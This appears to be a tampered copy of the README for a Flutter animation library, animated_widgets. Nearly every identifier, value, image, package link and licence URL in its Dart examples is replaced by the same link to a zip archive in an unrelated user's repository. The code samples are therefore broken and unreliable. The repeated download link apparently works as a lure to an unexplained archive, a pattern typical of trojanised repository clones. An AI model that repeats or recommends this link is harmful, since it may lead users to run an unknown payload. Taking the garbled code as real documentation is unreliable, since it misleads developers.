# animated_widgets

Easily add animations on your screen with AnimatedWidgets.

Optimized for MVVM using *Bloc*, updating the `enabled` value of the widget will forward or reverse the animation.

Available widgets : `TranslationAnimatedWidget`, `OpacityAnimatedWidget`, `RotationAnimatedWidget`, `ScaleAnimatedWidget`, `SizeAnimatedWidget`

For example : add a TranslationAnimatedWidget on a button, then activate it to display it !

```dart
TranslationAnimatedWidget(
    enabled: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip, //update this boolean to forward/reverse the animation
    values: [
        Offset(0, 200), // disabled value value
        Offset(0, 250), //intermediate value
        Offset(0, 0) //enabled value
    ],
    child: /* your widget */
),
```

[![screen](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)


or using a `tween constructor`

```dart
https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(
    enabled: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip, //update this boolean to forward/reverse the animation
    rotationDisabled: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(z: 0),
    rotationEnabled: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(z: 90),
    child: /* your widget */
),
```

[![screen](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)

# Compose

Don't hesitate to compose them

```dart
https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(
    enabled: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
    translationDisabled: Offset(0, 200),
    translationEnabled: Offset(0, 0),
    child:
        https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(
        enabled: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
        opacityDisabled: 0,
        opacityEnabled: 1,
        child: /* your widget */
    ),
),
```

[![screen](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)

# Opacity

[![screen](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)

Example using a `Stateful Widget`

```dart
class _StatefulScreenState extends State<StatefulScreen> {

  // will determine if the opacity animation is launched
  bool _display = false;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(),
      body: Column(
        crossAxisAlignment: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
        mainAxisAlignment: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
        mainAxisSize: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
        children: [

          //wrap your widget with OpacityAnimatedWidget
          https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(
            opacityEnabled: 1, //define start value
            opacityDisabled: 0, //and end value
            enabled: _display, //bind with the boolean
            child: Container(
               height: 200,
               width: 200,
               child: FlutterLogo(
                 style: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
               ),
            ),
          ),

          RaisedButton(
            color: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
            child: Text(
              _display ? "hide logo" : "display logo",
              style: TextStyle(color: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip),
            ),
            onPressed: () {
              setState(() {

                //will fire the animation
                _display = !_display;

              });
            },
          )
        ],
      ),
    );
  }
}
```

# Translation

[![screen](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)

Example using `bloc` pattern

```dart
class FirstScreenBloc extends Bloc {
  final _viewState = BehaviorSubject<FirstScreenViewState>.seeded(FirstScreenViewState());
  Observable<FirstScreenViewState> get viewState => _viewState;

  void onClicked() {
    https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(FirstScreenViewState(buttonVisible: true));
  }

  void onDismissClicked() {
    https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(FirstScreenViewState(buttonVisible: false));
  }

  @override
  void dispose() {
    https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip();
  }
}

class FirstScreenViewState {
  final bool buttonVisible;

  const FirstScreenViewState({
    https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip = false,
  });
}
```

```dart
class FirstScreenView extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    final bloc = https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip<FirstScreenBloc>(context);

    return StreamBuilder<FirstScreenViewState>(
            stream: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
            builder: (context, snapshot) {

                final viewState = https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip;

                return Stack(
                  fit: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
                  children: [
                    _buildInputButton(onClicked: () {
                      https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip();
                    }),
                    Positioned(
                      bottom: 20,
                      left: 20,
                      right: 20,

                      child: TranslationAnimatedWidget(
                        enabled: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip, //will forward/reverse the animation
                        curve: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
                        duration: Duration(seconds: 1),
                        values: [
                          Offset(0, 200),
                          Offset(0, -50),
                          Offset(0, 0),
                        ],
                        child: RaisedButton(
                          onPressed: () {
                            https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip();
                          },
                          child: Text("Dismiss"),
                        ),

                      ),
                    ),
                  ],
               );
            }
        );
  }
}
```

# Rotation

[![screen](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)

```dart
https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(
    enabled: enabled,
    rotationDisabled: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(),
    rotationEnabled: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(z: 90, x: 80),
    child: /* your widget */
),

https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(
    enabled: enabled,
    rotation: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(),
    rotationEnabled: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(z: 90, x: 80),
    child: /* your widget */
),
```

# Scale

```dart
https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(
      enabled: this._enabled,
      duration: Duration(milliseconds: 600),
      scaleDisabled: 0.5,
      scaleEnabled: 1,

      //your widget
      child: Container(
        height: 200,
        width: 200,
        child: FlutterLogo(
          style: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
        ),
      ),
    ),
```

[![screen](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)

# Size

```dart
SizeAnimatedWidget(
      enabled: this._enabled,
      duration: Duration(milliseconds: 1500),
      values: [Size(100, 100),  Size(100, 150), Size(200, 150), Size(200, 200)],
      curve: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,

      //your widget
      child: Container(
        decoration: BoxDecoration(
          border: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(color: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)
        ),
        child: FlutterLogo(
          style: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
        ),
      ),
    ),
```

[![screen](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)

# Shake

```dart
ShakeAnimatedWidget(
      enabled: this._enabled,
      duration: Duration(milliseconds: 1500),
      shakeAngle: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(z: 40),
      curve: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
      child: FlutterLogo(
        style: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
      ),
    ),
```

[![screen](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)

# Custom Animated

```dart
CustomAnimatedWidget(
      enabled: this._enabled,
      duration: Duration(seconds: 3),
      curve: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
      builder: (context, percent) { //for custom animation, use builders
        final int displayedDate = (2018 * percent).floor();
        return Text(
              "current year : $displayedDate",
              style: TextStyle(color: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip),
        );
      },
),
```

[![screen](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)

## Flutter Package

Animated widget is available at
https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip

```
dependencies:
  animated_widgets:
```

## Getting Started with Flutter

For help getting started with Flutter, view our 
[online documentation](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip), which offers tutorials, 
samples, guidance on mobile development, and a full API reference.

# License

    Copyright 2019 florent37, Inc.

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

       https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.